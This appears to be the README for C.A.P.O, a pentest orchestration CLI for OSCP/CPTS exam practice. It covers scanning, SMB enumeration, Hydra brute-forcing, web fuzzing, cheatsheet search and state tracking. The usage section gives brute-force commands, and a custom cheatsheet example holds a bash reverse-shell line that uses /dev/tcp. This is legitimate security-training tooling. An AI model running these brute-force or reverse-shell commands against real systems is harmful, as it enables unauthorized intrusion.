# C.A.P.O - Context-Aware Pentest Orchestrator

> **Your OSCP/CPTS Exam Companion** — Automates recon grunt work, remembers everything, suggests the right command at the right time.

```
   ██████╗ ██╗ █████╗ ██████╗  ██████╗
  ██╔════╝ ██║██╔══██╗██╔══██╗██╔═══██╗
  ██║      ██║███████║██████╔╝██║   ██║
  ██║      ██║██╔══██║██╔═══╝ ██║   ██║
  ╚██████╗ ██║██║  ██║██║     ╚██████╔╝
   ╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝
```

## Philosophy

- **No Auto-Pwn** — C.A.P.O automates *reconnaissance*, not exploitation. Every command is printed before execution.
- **Exam Compliant** — Built with OSCP/CPTS rules in mind. OSCP mode disables LLM features.
- **State-Aware** — Remembers your discoveries (ports, users, creds, dirs) and suggests next steps.
- **Ready Out-of-the-Box** — Ships with 100+ curated commands from HackTricks, PayloadsAllTheThings, GTFOBins.

## Quick Install

```bash
cd /path/to/capo
pip install -e .

# Optional: AI/LLM features for CPTS mode
pip install -e ".[cpts]"
```

## Quick Start

```bash
# Set your target
capo target set 10.10.10.100 --domain corp.local

# Connect targets to an active campaign
capo target campaign my-ad-lab

# Run full recon pipeline
capo scan full

# Or step by step
capo scan quick                      # All ports fast scan
capo scan detailed                   # -sC -sV on open ports

# SMB enumeration
capo nxc null                        # Null session
capo nxc rid-brute                   # RID brute force users
capo nxc ldap-enum                   # LDAP enumeration

# Password bruteforce (Hydra)
capo brute ssh -u root -p toor       # SSH single credential check
capo brute ssh -U users.txt -P passwords.txt   # SSH list bruteforce
capo brute http-post --form '/login.php:username=^USER^&password=^PASS^:F=Invalid' -U users.txt -P passwords.txt
capo brute http-get --form '/login.php:username=^USER^&password=^PASS^:F=Invalid' -U users.txt -P passwords.txt
capo brute web-form -m https-post-form --form '/auth:username=^USER^&password=^PASS^:F=invalid' -U users.txt -P passwords.txt

# Web fuzzing
capo web fuzz                        # Directory fuzzing
capo web fuzz --port 443 --https     # HTTPS fuzzing
capo web fuzz --host domain -d app.corp.local   # Fuzz by domain/subdomain
capo web vhost -d corp.local         # Virtual host discovery
capo web subdns -d corp.local        # DNS subdomain enumeration

# If .git directory is discovered during fuzzing:
# capo suggest will alert with the full runbook hints
capo query git-detect                # Confirm .git exposure
capo query git-dump                  # Dump with git-dumper
capo query git-grep-secrets          # Grep source for hardcoded secrets
capo query git-trufflehog            # Automated secret scanner

# Search cheatsheets (the killer feature)
capo search kerberos                 # Find Kerberos commands
capo search "privesc linux"          # Linux privilege escalation
capo query smb                       # Quick SMB commands
capo search "reverse shell bash"     # Reverse shells
capo categories                      # List all cheatsheet categories

# Copy command to clipboard with --copy
capo search asrep --copy

# Check state and suggestions
capo state show                      # Current target summary
capo state ports                     # Discovered ports
capo state users                     # Discovered users
capo suggest                         # Context-aware suggestions

# Methodologies
capo methodology list                # Available attack workflows
capo methodology start ad_kill_chain # Start AD kill chain workflow
capo methodology next                # Show next pending steps
capo methodology auto-check          # Auto-complete steps based on state

# Triggers
capo triggers list                   # Show all port triggers
capo triggers check                  # Manually check triggers for current state
capo triggers init                   # Create custom triggers template

# Background daemon (watches for state changes, fires suggestions)
capo daemon

# Exam mode
capo mode set oscp                   # Strict OSCP mode (no LLM)
capo mode set cpts                   # CPTS mode (all features)
capo mode show                       # Show current mode

# Capo Studio (web UI on port 8000)
capo studio
```

## Architecture

### Runtime Data (`~/.capo/`)

```
~/.capo/
├── campaigns/               # Multi-host engagement contexts
│   └── my-ad-lab/
│       ├── campaign.json    # AD domain, global users & credentials
│       └── loot/            # Global wordlists (users.txt, passwords.txt)
├── workspaces/              # Per-target workspaces
│   └── 10.10.10.100/
│       ├── state.json       # Target intelligence DB
│       ├── notes.md         # Auto-generated report template
│       ├── scans/           # Raw tool outputs (Nmap XML, ffuf JSON)
│       ├── loot/            # Target-specific hashes, SSH keys
│       ├── exploits/        # Downloaded exploits
│       └── evidence/        # Screenshots, proof
├── custom_cheatsheets/      # Your personal YAML commands
├── custom_triggers.yaml     # User-defined port triggers
└── config.json              # Global config
```

### Source Tree (`capo/`)

```
capo/
├── main.py                  # CLI entry point (imports app from cli/)
├── api.py                   # FastAPI REST API (capo.api:app)
├── config.py                # Paths, profiles, constants
├── state.py                 # State Manager (per-target JSON + FileLock)
├── campaign.py              # Campaign Manager (engagement-wide JSON)
├── errors.py                # Custom exceptions (TargetError, ToolNotFoundError, CapoError)
├── cli/
│   ├── __init__.py          # Typer app assembly, subapp registration
│   ├── target.py            # capo target commands
│   ├── scan.py              # capo scan commands
│   ├── nxc.py               # capo nxc commands
│   ├── brute.py             # capo brute commands
│   ├── web.py               # capo web commands
│   ├── state_cmds.py        # capo state commands
│   ├── mode_cmds.py         # capo mode + capo suggest
│   ├── cheatsheet.py        # capo search, query, categories
│   ├── triggers_cmds.py     # capo triggers commands
│   ├── methodology_cmds.py  # capo methodology commands
│   ├── daemon_cmds.py       # capo daemon command
│   ├── studio_cmds.py       # capo studio (launches web UI)
│   ├── report.py            # capo report commands
│   └── helpers.py           # Shared CLI helpers
├── modules/
│   ├── mode.py              # OSCP/CPTS mode manager
│   ├── triggers.py          # Port-trigger suggestion engine
│   ├── daemon.py            # Background state watcher + SuggestionRule
│   ├── methodology.py       # Attack workflow engine
│   ├── reporting.py         # CSV/Markdown export helpers
│   ├── cheatsheet/
│   │   └── engine.py        # YAML cheatsheet loader + fuzzy search
│   └── wrappers/
│       ├── base.py          # BaseWrapper (subprocess + dry-run + output)
│       ├── nmap_wrapper.py  # Nmap integration + XML parser
│       ├── nxc_wrapper.py   # NetExec/CME integration
│       ├── web_wrapper.py   # ffuf dir/vhost/subdns/recursive
│       └── brute_wrapper.py # Hydra SSH/web form bruteforce
├── core_cheatsheets/        # 13 built-in YAML command databases
│   ├── active_directory.yaml
│   ├── impacket.yaml
│   ├── password_cracking.yaml
│   ├── pivoting.yaml
│   ├── powerview.yaml
│   ├── privesc_linux.yaml
│   ├── privesc_windows.yaml
│   ├── recon_network.yaml
│   ├── recon_web.yaml
│   ├── services.yaml
│   ├── shells_transfer.yaml
│   ├── smb.yaml
│   └── web_attacks.yaml
├── core_methodologies/      # 4 attack workflow YAMLs
│   ├── ad_kill_chain.yaml
│   ├── linux_privesc.yaml
│   ├── web_app.yaml
│   └── windows_privesc.yaml
├── core_rules/              # Daemon suggestion rules (JMESPath)
│   └── active_directory.yaml
├── studio/                  # Capo Studio backend
│   ├── api.py               # Studio FastAPI app + serves frontend
│   ├── schemas.py           # Pydantic models for studio
│   └── yaml_manager.py      # YAML read/write helper
└── utils/
    └── display.py           # Rich terminal formatting
```

## REST API

Capo exposes a local REST API (`capo.api:app`) for integration with external tools and the web UI.

| Endpoint | Description |
|---|---|
| `GET /api/engagement/status` | Active target, campaign, and full state |
| `GET /api/state` | Current target, workspace, campaign context |
| `GET /api/suggestions` | All context-aware suggestions for the current target |
| `GET /api/config` | Capo config paths |
| `GET /api/cheatsheets` | List all cheatsheet filenames |
| `GET /api/cheatsheets/{filename}` | Load a cheatsheet as JSON |
| `POST /api/cheatsheets/{filename}` | Save edited cheatsheet to custom dir |
| `GET /api/methodologies` | List all methodology filenames |
| `GET /api/methodologies/{filename}` | Load a methodology as JSON |
| `POST /api/methodologies/{filename}` | Save edited methodology to custom dir |
| `GET /api/triggers/custom` | Return custom triggers |
| `POST /api/triggers/custom` | Save custom triggers |

## Scan Profiles

| Profile    | Nmap Rate | Nmap Timing | ffuf Threads | Use Case |
|------------|-----------|-------------|--------------|----------|
| aggressive | 5000      | -T4         | 80           | Lab/CTF  |
| normal     | 1000      | -T3         | 40           | Default  |
| stealth    | 300       | -T2         | 10           | Fragile targets |

```bash
capo scan quick --profile aggressive
capo web fuzz --profile stealth
```

## Custom Cheatsheets

Add YAML files to `~/.capo/custom_cheatsheets/`:

```yaml
category: "my-custom"
description: "My personal commands"
commands:
  - name: "my-revshell"
    description: "My go-to reverse shell"
    command: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
    tool: "bash"
    tags: ["shell", "custom"]
    os: "linux"
    exam: ["oscp", "cpts"]
```

Variables auto-injected from state: `{IP}`, `{DOMAIN}`, `{USER}`, `{PASS}`, `{USERFILE}`, `{PASSFILE}`, `{DC_IP}`, `{LHOST}`, `{LPORT}`, `{HOSTNAME}`, `{USERS_FILE}`, `{HASHES_FILE}`.

## Custom Triggers

Add `~/.capo/custom_triggers.yaml` to extend the suggestion engine:

```yaml
8080:
  - description: "Alternate HTTP — try Tomcat manager"
    command: "curl -s http://{IP}:8080/manager/html"
    tags: ["web", "tomcat"]
```

## OSCP vs CPTS Mode

| Feature | OSCP Mode | CPTS Mode |
|---------|-----------|-----------|
| Recon Wrappers | ✅ | ✅ |
| Cheatsheet Engine | ✅ | ✅ |
| State Management | ✅ | ✅ |
| Context Suggestions | ✅ | ✅ |
| LLM/AI Features | ❌ | ✅ (Phase 4) |
| Pivoting Helpers | ✅ | ✅ (Enhanced) |
| Metasploit | 1 machine only | Unrestricted |

## Roadmap

- [x] **Phase 1:** Core architecture, State Manager, CLI
- [x] **Phase 2:** Tool wrappers (Nmap, NetExec, ffuf, Hydra), parsers
- [x] **Phase 3:** Cheatsheet Engine, fuzzy search, variable injection
- [ ] **Phase 4:** AI/LLM integration (CPTS mode only)
- [x] **Phase 5:** Field testing on HTB/Proving Grounds

## License

MIT License
